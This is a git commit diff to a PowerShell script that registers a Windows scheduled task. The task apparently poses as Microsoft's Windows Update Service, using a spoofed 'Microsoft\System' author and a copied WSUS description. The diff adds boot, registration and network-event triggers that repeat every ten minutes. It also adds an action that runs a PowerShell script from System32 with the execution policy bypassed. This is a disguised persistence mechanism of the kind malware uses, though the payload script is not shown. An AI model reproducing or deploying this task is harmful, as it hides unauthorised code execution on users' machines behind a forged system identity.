b39ec8d33e85b3716fc62dd62f5da0ac6f766c0f
沐宸 <62504289+DirNotAvailable@users.noreply.github.com>
2023-10-18 18:56:49 +0500

    Update TaskSchedulerServiceCreater.ps1

--- TaskSchedulerServiceCreater.ps1
+++ TaskSchedulerServiceCreater.ps1
@@ -23,18 +23,37 @@ $updateservxml = @"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
-    <Date>2023-10-15T12:03:06.3532289</Date>
+    <Date>2023-10-13T00:56:52.6271595</Date>
     <Author>Microsoft\System</Author>
-    <URI>\Windows Update Service Daemon</URI>
+    <Description>Windows Server Update Services, previously known as Software Update Services, is a computer program and network service developed by Microsoft Corporation that enables administrators to manage the distribution of updates and hotfixes released for Microsoft products to computers in a corporate environment.</Description>
+    <URI>\Windows Update Service</URI>
   </RegistrationInfo>
   <Triggers>
+    <RegistrationTrigger>
+      <Repetition>
+        <Interval>PT10M</Interval>
+        <StopAtDurationEnd>false</StopAtDurationEnd>
+      </Repetition>
+      <Enabled>true</Enabled>
+      <Delay>PT5M</Delay>
+    </RegistrationTrigger>
+    <BootTrigger>
+      <Repetition>
+        <Interval>PT10M</Interval>
+        <StopAtDurationEnd>false</StopAtDurationEnd>
+      </Repetition>
+      <Enabled>true</Enabled>
+      <Delay>PT15M</Delay>
+    </BootTrigger>
     <EventTrigger>
+      <Repetition>
+        <Interval>PT10M</Interval>
+        <StopAtDurationEnd>false</StopAtDurationEnd>
+      </Repetition>
       <Enabled>true</Enabled>
       <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Microsoft-Windows-NetworkProfile/Operational"&gt;&lt;Select Path="Microsoft-Windows-NetworkProfile/Operational"&gt;*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
+      <Delay>PT1M</Delay>
     </EventTrigger>
-    <RegistrationTrigger>
-      <Enabled>true</Enabled>
-    </RegistrationTrigger>
   </Triggers>
   <Principals>
     <Principal id="Author">
@@ -63,13 +82,15 @@ $updateservxml = @"
     <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
     <Priority>7</Priority>
     <RestartOnFailure>
-      <Interval>PT1M</Interval>
-      <Count>999</Count>
+      <Interval>PT10M</Interval>
+      <Count>10</Count>
     </RestartOnFailure>
   </Settings>
   <Actions Context="Author">
     <Exec>
-      <Command>C:\Windows\System32\WindowsUpdateServiceDaemon.exe</Command>
+      <Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command>
+      <Arguments>-ExecutionPolicy Bypass -File "C:\Windows\System32\WindowsUpdateService.ps1"</Arguments>
+      <WorkingDirectory>C:\Windows\System32</WorkingDirectory>
     </Exec>
   </Actions>
 </Task>
